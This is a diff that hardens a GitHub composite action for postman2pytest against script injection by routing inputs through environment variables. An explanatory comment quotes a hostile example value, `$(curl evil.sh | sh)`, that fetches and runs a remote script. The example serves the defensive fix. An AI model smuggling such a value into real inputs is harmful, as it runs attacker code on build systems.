@@ -35,7 +35,9 @@ inputs:
     required: false
     default: "true"
   pytest-args:
-    description: Extra arguments passed to pytest, for example "-k smoke --maxfail=1".
+    description: >-
+      Extra arguments passed to pytest, split on whitespace, for example "-k smoke --maxfail=1".
+      Quoted arguments are not supported: "-m 'not slow'" arrives as two words.
     required: false
     default: ""
   python-version:
@@ -58,6 +60,11 @@ outputs:
   tests-path:
     description: Path of the generated pytest file.
     value: ${{ steps.convert.outputs.tests-path }}
+  tests-dir:
+    description: >-
+      Directory holding the generated suite. Upload this rather than tests-path: collections
+      with auth headers also produce a sibling conftest.py, and the suite does not collect without it.
+    value: ${{ steps.convert.outputs.tests-dir }}
   test-count:
     description: Number of generated test functions.
     value: ${{ steps.convert.outputs.test-count }}
@@ -70,13 +77,21 @@ runs:
       with:
         python-version: ${{ inputs.python-version }}
 
+    # Every input reaches bash through env, never through ${{ }} inside a run
+    # block. Expression results are pasted into the script text before bash
+    # parses it, so quoting in the script cannot contain them: a collection
+    # named `$(curl evil.sh | sh)` would execute. Read as "$COLLECTION" it is
+    # only ever data.
     - name: Install postman2pytest
       if: inputs.install != 'skip'
       shell: bash
+      env:
+        VERSION: ${{ inputs.version }}
       run: |
+        set -euo pipefail
         python -m pip install --upgrade pip
-        if [ -n "${{ inputs.version }}" ]; then
-          pip install "postman2pytest==${{ inputs.version }}" pytest requests
+        if [ -n "$VERSION" ]; then
+          pip install "postman2pytest==${VERSION}" pytest requests
         else
           pip install postman2pytest pytest requests
         fi
@@ -84,25 +99,49 @@ runs:
     - name: Convert collection
       id: convert
       shell: bash
+      env:
+        COLLECTION: ${{ inputs.collection }}
+        OUT: ${{ inputs.out }}
+        INPUT_FORMAT: ${{ inputs.input-format }}
+        ENV_FILE: ${{ inputs.env-file }}
+        FILTER_FOLDER: ${{ inputs.filter-folder }}
       run: |
         set -euo pipefail
-        args=(--collection "${{ inputs.collection }}" --out "${{ inputs.out }}" --input-format "${{ inputs.input-format }}")
-        [ -n "${{ inputs.env-file }}" ] && args+=(--env "${{ inputs.env-file }}")
-        [ -n "${{ inputs.filter-folder }}" ] && args+=(--filter-folder "${{ inputs.filter-folder }}")
-        [ -n "${{ inputs.base-url }}" ] && args+=(--base-url "${{ inputs.base-url }}")
+        args=(--collection "$COLLECTION" --out "$OUT" --input-format "$INPUT_FORMAT")
+        if [ -n "$ENV_FILE" ]; then args+=(--env "$ENV_FILE"); fi
+        if [ -n "$FILTER_FOLDER" ]; then args+=(--filter-folder "$FILTER_FOLDER"); fi
         postman2pytest "${args[@]}"
+
+        if [ ! -f "$OUT" ]; then
+          echo "postman2pytest reported success but ${OUT} does not exist" >&2
+          exit 1
+        fi
         # Counted from the generated file rather than parsed from log output:
         # log wording is free to change, the def-line shape is the contract.
-        count=$(grep -c "^def test_" "${{ inputs.out }}" || true)
-        echo "tests-path=${{ inputs.out }}" >> "$GITHUB_OUTPUT"
-        echo "test-count=${count}" >> "$GITHUB_OUTPUT"
-        echo "Generated ${count} test(s) into ${{ inputs.out }}"
+        # The template emits one top-level `def test_...` per request; if that
+        # ever changes to async, class-nested or parametrised tests, count with
+        # `pytest --collect-only` instead.
+        count=$(grep -c "^def test_" "$OUT" || true)
+        count=${count:-0}
+        {
+          echo "tests-path=${OUT}"
+          echo "tests-dir=$(dirname "$OUT")"
+          echo "test-count=${count}"
+        } >> "$GITHUB_OUTPUT"
+        echo "Generated ${count} test(s) into ${OUT}"
 
+    # Anything other than an explicit "false" runs the suite. The opposite
+    # test would turn a typo such as "True" into a silent skip, and an action
+    # that reports success without running the tests is worse than one that
+    # fails.
     - name: Run generated tests
-      if: inputs.run-tests == 'true'
+      if: inputs.run-tests != 'false'
       shell: bash
       env:
         BASE_URL: ${{ inputs.base-url }}
+        OUT: ${{ inputs.out }}
+        PYTEST_ARGS: ${{ inputs.pytest-args }}
       run: |
         set -euo pipefail
-        pytest "${{ inputs.out }}" ${{ inputs.pytest-args }}
+        read -ra extra <<< "$PYTEST_ARGS"
+        pytest "$OUT" "${extra[@]}"
